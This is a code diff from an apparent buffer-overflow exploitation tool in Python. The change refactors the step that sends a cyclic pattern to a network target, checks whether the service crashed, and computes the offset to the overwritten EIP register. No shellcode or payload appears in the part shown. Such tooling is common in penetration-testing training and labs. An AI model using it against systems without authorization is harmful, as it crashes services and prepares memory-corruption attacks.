@@ -309,22 +309,18 @@ def find_eip_offset(target, args):
 		print(f'Generating pattern with length {pattern_length} Bytes')
 		pattern = genPattern(pattern_length, args)
 		# connect and send
-		try:
-			buffer = args.prefix + pattern + args.postfix
-			connect_and_send(target, buffer, args)
-			# check if crashed
-			if crashcheck(target, args):
-				print('Target not responding anymore.')
-				eip = ""
-				while len(eip) != 8:
-					eip = input('EIP? (hex only, no 0x, no \\x, in order.)\n> ')
-				offset = findPattern(pattern_length, eip, args)
-					
-				print(f'Offset found: {offset}')
-				return offset
-		except:
-			print(sys.exc_info())
-			exit(-1)
+		buffer = args.prefix + pattern + args.postfix
+		connect_and_send(target, buffer, args)
+		# check if crashed
+		if crashcheck(target, args):
+			print('Target not responding anymore.')
+			eip = ""
+			while len(eip) != 8:
+				eip = input('EIP? (hex only, no 0x, no \\x, in order.)\n> ')
+			offset = findPattern(pattern_length, eip, args)
+				
+			print(f'Offset found: {offset}')
+			return offset
 	print("Target didn't crash.")
 	exit(-1)
 
@@ -360,11 +356,10 @@ def genPattern(pattern_length, args):
 	pattern = pattern.encode('raw_unicode_escape')
 	return pattern
 
-def findPattern(length, eip, args):
-	eip_str = bytes_to_pystring(eip).replace('\\x','')
-	print(f'EIP-LE: {eip}')
+def findPattern(length, eip_hexstr, args):
+	print(f'EIP-LE: {eip_hexstr}')
 	# reverse, because intel is weird (little endian)
-	pattern_found = bytes.fromhex(eip).decode('ascii')[::-1]
+	pattern_found = bytes.fromhex(eip_hexstr).decode('ascii')[::-1]
 	print(f'Pattern: "{pattern_found}"')
 	
 	# find pattern offset
